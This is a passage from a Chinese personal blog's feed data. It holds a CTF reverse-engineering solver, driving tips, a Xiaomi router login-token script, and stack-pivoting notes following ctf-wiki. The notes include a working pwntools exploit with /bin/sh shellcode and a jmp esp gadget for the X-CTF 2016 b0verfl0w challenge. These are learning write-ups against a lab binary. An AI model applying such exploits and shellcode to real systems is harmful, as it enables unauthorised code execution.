r12)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(x))</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># get crypto table</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index是source在replace中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(crypto_table)</span></span><br><span class="line"><span class="comment">#print(revsere_table)</span></span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmp_data:</span><br><span class="line">    tmp+=de_cmp(i)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = decrypt(tmp, crypto_table)</span><br><span class="line">    tmp = reverse_order(tmp, revsere_table)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> tmp))</span><br></pre></td></tr></table></figure></div>]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Reverse</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>手动挡驾驶经验分享</title>
+    <url>/2023/05/02/manual-drive-tips/</url>
+    <content><![CDATA[<p>本人刚拿驾照，在这里分享一些自己知道的手动挡驾驶技巧</p>
+<h3 id="降档补油"><a href="#降档补油" class="headerlink" title="降档补油"></a>降档补油</h3><p>为什么要降档？某些时候我们需要降档来更好地利用发动机。在跑山时，为了防止刹车过热，我们可以依赖发动机来制动。正常情况下只要不给油，家用车的发动机转速一般在1k以下，所以只要发动机高于这个转速就会有制动效果。根据杠杆原理，挡位越低，发动机制动效果越明显。同样根据杠杆原理，档位越低，发动机输出给轮胎的扭矩越大，在超车时提速更快，所以超车和陡坡常常需要降档。</p>
+<p>总所周知，不踩离合时，发动机转速和轮胎转速成比例，这个比例取决于挂的挡位，所以当换档时，这个比例会改变。</p>
+<p>一般来说新手开车降档操作和升档一样，都是踩离合拨挡杆，但这样的话车子会抖一下。这是因为踩下离合时，发动机会与轮胎断开连接，此时如果没有给油，发动机的转速会逐渐降低。但注意我说的是降档，在相同的车速下，低档位匹配的转速应该更高，这也就解释了为什么松离合车会抖一下 —— 离合片合上瞬间发动机会给轮胎一个阻力，使得车身会抖一下，同时轮胎传动会把发动机转速拖高。</p>
+<p>为了避免这种情况，我们可以在降档的时候补一脚油使得发动机转速升一点，然后快速降档。如果补油量控制得好，基本可以避免车身发抖。</p>
+<p>对于不同车，油门力度的控制也不同。具体的操作大概是先轻踩油门，再踩离合降档，或者技术比较好的可以踩离合的同时补油。</p>
+<h4 id="跟趾"><a href="#跟趾" class="headerlink" title="跟趾"></a>跟趾</h4><p>我还不会，以后再写</p>
+<p>咕咕咕</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>汽车</tag>
+        <tag>日常</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小米路由器登录脚本</title>
+    <url>/2023/03/01/miRouterLogin/</url>
+    <content><![CDATA[<h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>最近研究了下学校校园网，本来想试试不登录的情况下宿舍和教学楼的IP能否互通，答案是不能。这个脚本本来是为了从宿舍路由器获得WANIP而写的，但既然不能互通，拿到IP也没啥用了。脚本地址：<a class="link"   href="https://github.com/Hexrotor/miRouterLogin" >miRouterLogin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>登进路由器，url是这样的：<code>http://路由器IP/cgi-bin/luci/;stok=3064506d8615d0a05cad3356af54d898/web/home</code></p>
+<p>中间有串参数就是token，我的目的是要模拟网页登录拿到它</p>
+<p>而获取WANIP的方式可以通过控制台轻松查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/router_pppoe_status.jpg"
+                     
+                ></p>
+<p>url是这样的：<code>http://路由器IP/cgi-bin/luci/;stok=3064506d8615d0a05cad3356af54d898/api/xqnetwork/pppoe_status</code></p>
+<p>可见只要拿到token，一切都好说，为此，我们需要从登录页面入手，了解网页是如何跳转到包含token的网址的。</p>
+<p>这个过程我参考了<a class="link"   href="https://blog.csdn.net/hackzkaq/article/details/119676876" >https://blog.csdn.net/hackzkaq/article/details/119676876 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>总之先在登录界面抓包，我嫌麻烦就在手机上用HttpCanary抓的</p>
+<p>抓包发现了登录时会向<code>http://路由器IP/cgi-bin/luci/api/xqsystem/login</code> 这个url发送POST请求，内容是类似<code>username=admin&amp;password=0afb4d1dc7ce1c48afa11233bc055b9106ba1c8cd&amp;logtype=2&amp;nonce=0_98%3A15%3A3d%3Afb%3A3b%3Acb_1677680921_8869</code>这样的数据，其中nonce和password都是js动态生成的。</p>
+<p>查找网页源代码，发现登录时调用loginHandle方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/loginhandle.jpg"
+                     
+                ></p>
+<p>源码显示加密是用了Encrypt方法，继续搜索关键词，最终发现会涉及<code>aes.js</code>和<code>sha1.js</code>两个源文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/encryptjs.jpg"
+                     
+                ></p>
+<p>捋一下逻辑就是：输入密码，由loginHandle方法调用Encrypt方法来生成nonce和加密后的password。将nonce和password POST给路由器，路由器就会返回token</p>
+<p>可以直接把要用到的js代码粘到一个文件里，方便调用<br>Python脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参考自https://blog.csdn.net/hackzkaq/article/details/119676876</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> execjs <span class="comment"># 导入PyExecJS 库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_js</span>(): <span class="comment"># 导入js文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;login.js&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">    line = f.readline()</span><br><span class="line">    htmlstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        htmlstr = htmlstr + line</span><br><span class="line">        line = f.readline()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> htmlstr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">ip, passwd</span>): <span class="comment"># 使用curl获取token</span></span><br><span class="line">    jsstr = get_js()</span><br><span class="line">    ctx = execjs.<span class="built_in">compile</span>(jsstr)</span><br><span class="line">    utf = ctx.call(<span class="string">&quot;tokenGen&quot;</span>, passwd)</span><br><span class="line">    <span class="comment">#print(&quot;utf: &quot; , utf)</span></span><br><span class="line">    en = urlencode(utf, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(&quot;en: &quot; + en)</span></span><br><span class="line">    cmd = <span class="string">&quot;curl -ss -X POST -H \&quot;Accept-Encoding:gzip, deflate\&quot; -H \&quot;Accept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\&quot; -H \&quot;Host:192.168.114.1\&quot; -H \&quot;Connection:keep-alive\&quot; -H \&quot;User-Agent:Mozilla/5.0 (Linux; Android 12; 22081212C Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36\&quot; -H \&quot;Content-Length:126\&quot; -H \&quot;Accept:*/*\&quot; -H \&quot;X-Requested-With:XMLHttpRequest\&quot; -H \&quot;Content-Type:application/x-www-form-urlencoded; charset=UTF-8\&quot; -H \&quot;Origin:http://&quot;</span>+ip+<span class="string">&quot;\&quot; -H \&quot;Referer:http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/web\&quot; -d \&quot;&quot;</span>+en+<span class="string">&quot;\&quot; \&quot;http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/api/xqsystem/login\&quot;|jq -r \&quot;.token\&quot;&quot;</span></span><br><span class="line">    <span class="comment">#print(&quot;cmd: &quot; + cmd)</span></span><br><span class="line">    apikey = os.popen(cmd).read()[:-<span class="number">1</span>] <span class="comment"># 执行curl</span></span><br><span class="line">    <span class="keyword">return</span> apikey</span><br><span class="line"></span><br><span class="line">ip = <span class="built_in">input</span>(<span class="string">&quot;Please enter the router ip: &quot;</span>)</span><br><span class="line">passwd = <span class="built_in">input</span>(<span class="string">&quot;Please enter password: &quot;</span>)</span><br><span class="line">token = get_token(ip, passwd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token: &quot;</span> + token)</span><br><span class="line">url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;/cgi-bin/luci/;stok=&quot;</span>+token+<span class="string">&quot;/api/xqnetwork/pppoe_status&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;weburl: &quot;</span>+ url)</span><br><span class="line"><span class="comment">#print(&quot;apikey :&quot;+ apikey)</span></span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&quot;curl -ss \&quot;&quot;</span>+url+<span class="string">&quot;\&quot;|jq&quot;</span>).read())</span><br></pre></td></tr></table></figure></div>
+
+<p>执行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/router_script_stdout.jpg"
+                     
+                ></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>花式栈溢出</title>
+    <url>/2023/04/24/stackoverflow-tips/</url>
+    <content><![CDATA[<p>本文是本人跟着ctf-wiki上学之后做的笔记，写得比较详细</p>
+<h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>栈转移是指劫持<code>SP</code>指针到我们能控制的位置，以便实现一些之前不方便的操作</p>
+<p>一般来说需要使用该技巧的情况有：</p>
+<ul>
+<li>可控的栈溢出字节数较少，难以构造长 payload 进行 rop</li>
+<li>有PIE地址随机化，栈地址未知。可以通过劫持转移栈到已知地址</li>
+<li>其他漏洞难利用，转换后更方便，比如把栈转移到堆空间后写rop</li>
+</ul>
+<p>要求有：</p>
+<ul>
+<li>可控程序执行流</li>
+<li>可控<code>SP</code>指针</li>
+</ul>
+<p>一般来说控制<code>SP</code>指针用<code>pop rsp/esp</code></p>
+<p><code>__libc_csu_init</code>中就有这种gadgets，但要使用偏移</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">gef➤  x/7i <span class="number">0x000000000040061a</span></span><br><span class="line"><span class="number">0x40061a</span> &lt;__libc_csu_init+<span class="number">90</span>&gt;:  pop    rbx</span><br><span class="line"><span class="number">0x40061b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;:  pop    rbp</span><br><span class="line"><span class="number">0x40061c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;:  pop    r12</span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret    </span><br><span class="line">gef➤  x/7i <span class="number">0x000000000040061d</span></span><br><span class="line"><span class="number">0x40061d</span> &lt;__libc_csu_init+<span class="number">93</span>&gt;:  pop    rsp  <span class="comment"># 原本pop r12</span></span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret</span><br></pre></td></tr></table></figure></div>
+
+<p>此外，还有更加高级的 fake frame，要求有一段可以控制内容的内存，一般是如下：</p>
+<ul>
+<li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
+<li>heap。但是这个需要我们能够泄露堆地址。</li>
+</ul>
+<h4 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec: 什么都没开</span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+
+<p>IDA反编译：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+18h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>); # 读<span class="number">50</span>个字符，不好构造长payload</span><br><span class="line">  <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s)</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这题的思路是在栈上填入短<code>shellcode</code>，然后想办法<code>jmp esp</code>，<code>EIP</code>就会跳到栈上。我们提前在栈上填入机器码处理<code>esp</code>，使<code>esp</code>指向<code>shellcode</code>后再次<code>jmp esp</code></p>
+<p>构造的payload结构如下：</p>
+<p><code>shellcode|padding|ebp|jmp_esp_addr|asm(&quot;sub esp, 0x?;jmp esp&quot;)</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找 jmp esp</span></span><br><span class="line">$ ROPgadget --binary b0verfl0w --only <span class="string">&quot;jmp&quot;</span>|grep esp</span><br><span class="line">0x08048504 : jmp esp</span><br></pre></td></tr></table></figure></div>
+
+<p>执行<code>sub esp</code>时<code>ESP</code>到shellcode的距离可以通过看payload长度计算出来</p>
+<p>首先<code>shellcode+padding</code>是0x20</p>
+<p><code>ebp</code>0x4</p>
+<p><code>jmp_esp_addr</code> 0x4</p>
+<p>我们需要设置<code>esp</code>到<code>shellcode</code>，而此时<code>esp</code>在<code>jmp_esp_addr</code>的后面指向asm，所以需要对<code>esp</code> - 0x28</p>
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">shellcode.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 填充shellcode长度</span></span><br><span class="line">sub_esp_jmp_esp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>) <span class="comment">#生成机器码</span></span><br><span class="line">jmp_esp_addr = <span class="number">0x08048504</span></span><br><span class="line">payload = flat([shellcode, <span class="string">&quot;bbbb&quot;</span>, jmp_esp_addr, sub_esp_jmp_esp])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="frame-faking-栈伪造"><a href="#frame-faking-栈伪造" class="headerlink" title="frame faking(栈伪造)"></a>frame faking(栈伪造)</h3><p>构建一个虚假的栈帧来控制程序的执行流。我们需要同时控制<code>IP</code>和<code>BP</code>寄存器，这样我们就能在控制程序执行流的同时也改变栈帧的位置</p>
+<p>以下内容基于x86架构</p>
+<p>这种攻击方式payload的格式一般如下：<code>buffer padding|fake ebp|leave_ret_addr|</code>其中<code>fake ebp</code>为我们构造的假栈帧的基址。注意这里多了<code>leave</code>指令</p>
+<p>回顾<code>leave</code>指令的等效用法：<code>mov esp, ebp; pop ebp</code> 在执行此命令之前，<code>EBP</code>指向栈中saved ebp</p>
+<p>执行后，<code>EBP</code>回到主调函数位置，<code>ESP</code>指向retaddr</p>
+<p>而<code>ret</code>指令实际上等效于<code>pop eip</code>，执行后<code>ESP</code>完全回到主调函数的原位置</p>
+<p>上面提到的payload中，<code>retaddr</code>被覆盖为<code>leave_ret_addr</code>，这导致程序ret后会再次执行<code>leave</code> <code>ret</code></p>
+<p>接下来的描述有点绕，在这里先明确一些代号：</p>
+<ul>
+<li><code>ebp2</code>是一个值，这个值是一个内存地址，是我们最终想赋给寄存器<code>EBP</code>的值(使<code>EBP</code>指向这个地址)</li>
+<li><code>ebp2_addr</code>是一个值，这个值是一个内存地址，该处内存保存着<code>ebp2</code>的值</li>
+</ul>
+<p>假栈帧大致格式：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+---------------------+</span><br><span class="line">| arg2 of function    | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1 of function    |</span><br><span class="line">+---------------------+</span><br><span class="line">| leave_ret_addr      |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                |</span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>
+
+<p>payload的<code>fake ebp</code> 就是 <code>ebp2_addr</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">buffer padding|fake ebp|leave_ret_addr|</span><br><span class="line">buffer padding|ebp2_addr|leave_ret_addr|</span><br></pre></td></tr></table></figure></div>
+
+<p>利用此payload，我们可以依次做以下事情：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave:</span><br><span class="line">	mov esp, ebp</span><br><span class="line">	pop ebp # 使ebp变为ebp2_addr</span><br><span class="line"></span><br><span class="line">ret # run leave ret again</span><br><span class="line"></span><br><span class="line">leave:</span><br><span class="line">	mov esp, ebp # 使esp也变为ebp2_addr，这让esp指向了ebp2_addr</span><br><span class="line">	pop ebp # 此时esp指向ebp2_addr，此操作会将该处内存的ebp2值赋给ebp</span><br><span class="line"></span><br><span class="line">ret # return to target function 需要提前在ebp2_addr+4处写入target function addr</span><br><span class="line"></span><br><span class="line"># after target function, return to leave_ret_addr</span><br><span class="line"># 然后程序又会执行类似的操作。如果我们在ebp2指向的地址处也设置好了相应内容，就能继续劫持ebp+eip</span><br><span class="line"># 当然，如果假栈帧能控制的大小足够长，我们也可以直接像以前一样构造纯粹的rop，不再借助leave ret</span><br><span class="line"># 即假栈帧的结构为:</span><br><span class="line"></span><br><span 